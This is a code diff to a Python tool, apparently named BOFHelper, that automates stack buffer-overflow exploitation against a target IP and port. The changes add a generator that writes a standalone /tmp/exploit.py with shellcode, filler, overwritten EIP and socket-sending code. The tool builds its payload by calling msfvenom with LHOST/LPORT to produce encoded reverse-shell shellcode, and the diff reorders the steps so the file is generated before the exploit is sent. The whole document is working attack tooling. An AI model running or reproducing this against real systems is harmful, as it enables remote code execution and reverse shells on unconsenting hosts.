@@ -53,6 +53,17 @@ def is_register(reg: str) -> bool:
     return True
 
 
+def bytes_escape_all(in_byte: bytes) -> list[str]:
+    out_str = []
+    for b in in_byte:
+        out_str.append(''.join('\\x{:02x}'.format(b)))
+    return out_str
+
+
+def bytes_escape_all_str(in_bytes: bytes) -> str:
+    return "'{}'".format(''.join('\\x{:02x}'.format(b) for b in in_bytes))
+
+
 def split_list(lst: list, n: int) -> list[list]:
     d, r = divmod(len(lst), n)
     for i in range(n):
@@ -99,6 +110,24 @@ class BOFHelper:
         self._spaceExpanded = False
         self._eip = b""
         self._exploit = b""
+        self._fileGenerated = False
+
+    def __del__(self):
+        if not self._fileGenerated:
+            self._step_log("Printing information...")
+            if self._eipObtained:
+                self._success_log("EIP Offset: %d" % self._eipOffset)
+            if self._badCharsFound:
+                self._success_log("Bad characters: 0x%s" % " 0x".join(self._badChars))
+            if self._espPaddingSet:
+                self._success_log("ESP Padding: %d" % self._espPadding)
+            if self._shellCodeGenerated and not self._shellCodeInESP:
+                self._success_log(("First stage shell code: %s" % bytes_escape_all_str(self._firstStage))
+                                  .replace("'", ""))
+            if self._spaceExpanded:
+                self._success_log("Stack space: %d" % self._stackSpace)
+            if self._eip:
+                self._success_log(("Overridden EIP: %s" % bytes_escape_all_str(self._eip)).replace("'", ""))
 
     # Logs & Helpers
 
@@ -143,6 +172,10 @@ class BOFHelper:
         for option in self._liveOptions:
             self._header = self._origHeader.replace(option, self._liveOptions[option])
 
+    def _process_header_file(self, header: str) -> str:
+        header = header.replace(live_option_long("payload_len").decode(), "' + str(len(payload)) + '")
+        return header
+
     # @function send_data
     # @abstract Helper function sending data to designated port on the target.
     # @discussion   In this function, a socket is created to send the data in @buffer to @self._port.
@@ -159,7 +192,7 @@ class BOFHelper:
         try:
             s.connect((self._ip, self._port))
             payload_len = live_option_long("payload_len")
-            if payload_len in self._liveOptions:
+            if payload_len in self._origHeader:
                 self._liveOptions[payload_len] = str(len(buffer) + len(self._prefix) + len(self._suffix)).encode()
             self._process_header()
             s.send(self._header + self._prefix + buffer + self._suffix)
@@ -498,9 +531,8 @@ class BOFHelper:
                 return BOFErrorFailure
             self._lIP = ip
 
-        payload = execute("msfvenom -p %s LHOST=%s LPORT=%d EXITFUNC=thread -f raw –e x86/shikata_ga_nai -b \"\\x%s\""
-                          % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
-        self._shellCode += payload
+        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%d EXITFUNC=thread -f raw –e x86/shikata_ga_nai"
+                                   "-b \"\\x%s\"" % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
         self._shellCodeGenerated = True
         return BOFErrorSuccess
 
@@ -630,6 +662,65 @@ class BOFHelper:
         self._success_log("Exploit built successfully!", True)
         return BOFErrorSuccess
 
+    # @function generate_file
+    # @abstract Generate exploit.py that could be used for manual exploitation.
+    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.
+
+    def generate_file(self) -> int:
+        self._func_log("Generating exploit.py...")
+
+        if not self._exploit:
+            if self._build_exploit():
+                return BOFErrorFailure
+
+        heading = "#!/usr/bin/python\n" \
+                  "import socket\n\n" \
+                  "try:\n" \
+                  "    print(\"Sending payload...\")\n\n"
+        variables = "    shellcode = ("
+        shell_str = bytes_escape_all(self._shellCode)
+        len_shell = len(shell_str)
+        for i in range(0, len_shell, 15):
+            if i > 0:
+                variables += "                 "
+            variables += "'" + ''.join(shell_str[i:i + 15])
+            if len_shell - i > 15:
+                variables += "'\n"
+        variables += "')\n\n"
+
+        variables += "    # Bad characters: 0x%s" % " 0x".join(self._badChars)
+        variables += "    filler = 'A' * %d\n" \
+                     "    eip = %s\n" \
+                     "    offset = 'B' * %d\n" \
+                     % (self._eipOffset if self._shellCodeInESP else self._eipOffset - len(self._shellCode),
+                        bytes_escape_all_str(self._eip), self._espPadding)
+        if self._shellCodeInESP:
+            variables += ("    payload = %s + filler + eip + offset + shellcode + %s\n\n"
+                          % (self._prefix, self._suffix)).replace("b'", "'")
+        if not self._shellCodeInESP:
+            variables += "    first_stage = %s\n" % self._firstStage
+            variables += ("    payload = %s + filler + shellcode + eip + offset + first_stage + %s\n\n"
+                          % (self._prefix, self._suffix)).replace("b'", "'")
+
+        variables += ("    buffer = %s\n"
+                      "    buffer += payload\n\n" % self._origHeader).replace("    buffer = b", "    buffer = ")
+        variables = self._process_header_file(variables)
+
+        footing = "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
+                  "    s.connect(('%s', %d))\n" \
+                  "    s.send(buffer)\n" \
+                  "    s.recv(1024)\n" \
+                  "    s.close()\n\n" \
+                  "except:\n" \
+                  "    print('Exploitation failed!')\n" % (self._ip, self._port)
+
+        file = open("/tmp/exploit.py", "w")
+        file.write(heading + variables + footing)
+        file.close()
+        self._success_log("Successfully generated /tmp/exploit.py!")
+        self._fileGenerated = True
+        return BOFErrorSuccess
+
     # @function send_exploit
     # @abstract Dispatch the exploit.
     # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.
@@ -650,40 +741,6 @@ class BOFHelper:
         self._success_log("Exploitation completed!!!")
         return BOFErrorSuccess
 
-    # @function generate_file
-    # @abstract Generate exploit.py that could be used for manual exploitation.
-    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.
-
-    def generate_file(self) -> int:
-        self._func_log("Generating exploit.py...")
-
-        if not self._exploit:
-            if self._build_exploit():
-                return BOFErrorFailure
-
-        output = "#!/usr/bin/python\n" \
-                 "import socket\n\n" \
-                 "try:" \
-                 "  filler = b\"A\" * %d\n" \
-                 "  eip = %s\n" \
-                 "  offset = b\"B\" * %d\n" \
-                 "  shellcode = %s\n" % (self._eipOffset, self._eip, self._espPadding, self._shellCode.decode())
-
-        # "  payload = %s + filler + eip + offset + shellcode + %s\n\n" \
-        # "  buffer = %s\n" \
-        # "  buffer += payload \n\n" \
-        # "  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
-        # "  s.connect((\"%s\", %s))\n" \
-        # "  s.send(exploit)\n" \
-        # "  s.recv(1024)\n" \
-        # "  s.close()" % (self._eipOffset, self._ip, self._port)
-
-        with open("/tmp/exploit.py", "w") as file:
-            file.write(output)
-            file.close()
-            self._success_log("Successfully generated /tmp/exploit.py!")
-            return BOFErrorSuccess
-
     # @function perform_bof
     # @abstract Perform a full BoF with member functions.
     # @result True if succeeded; False if failed.
@@ -697,8 +754,8 @@ class BOFHelper:
             return False
         if self.expand_space():
             return False
-        if self.send_exploit():
-            return False
         if self.generate_file():
+            return False
+        if self.send_exploit():
             return False
         return True
